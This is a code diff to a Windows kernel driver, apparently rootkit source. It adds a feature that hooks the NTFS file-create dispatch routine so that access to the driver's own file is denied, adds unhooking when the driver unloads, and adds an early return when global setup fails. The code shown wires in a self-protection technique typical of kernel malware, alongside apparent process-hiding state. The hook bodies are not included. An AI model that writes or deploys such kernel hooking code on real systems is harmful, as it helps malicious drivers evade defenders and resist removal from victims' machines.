@@ -4,6 +4,13 @@
 #include "DriverMeta.hpp"
 #include "Globals.hpp"
 #include "IOCTLS.hpp"
+#include "FileUtils.hpp"
+
+// --------------------------------------------------------------------------------------------------------
+
+// Features
+
+#define DENY_DRIVER_FILE_ACCESS
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -41,6 +48,19 @@ BeUnload(PDRIVER_OBJECT DriverObject)
             BeGlobals::beBuryTargetProcesses.length--;
         }
         ExReleaseFastMutex(&BeGlobals::beBuryMutex);
+    }
+
+    // Unhook if NTFS was hooked
+    if (BeGlobals::originalNTFS_IRP_MJ_CREATE_function != NULL)
+    {
+        if (BeUnhookNTFSFileCreate() == STATUS_SUCCESS)
+        {
+            LOG_MSG("Removed NTFS hook!\n");
+        }
+        else
+        {
+            LOG_MSG("Failed to remove NTFS hook!\n");
+        }
     }
         
     IoDeleteSymbolicLink(&usDosDeviceName);
@@ -118,9 +138,17 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     pDriverObject->MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)BeCreate;             // CreateFile
     pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)BeIoControl;  // DeviceIoControl
     
-    BeGlobals::BeInitGlobals(pDriverObject);
+    NtStatus = BeGlobals::BeInitGlobals(pDriverObject);
+    if (NtStatus != 0)
+    {
+        return NtStatus;
+    }
 
     NtStatus = IoCreateSymbolicLink(&usDosDeviceName, &usDriverName); // Symbolic Link simply maps a DOS Device Name to an NT Device Name.
+
+#ifdef DENY_DRIVER_FILE_ACCESS
+    NtStatus = BeHookNTFSFileCreate();
+#endif
 
     return NtStatus;
 }
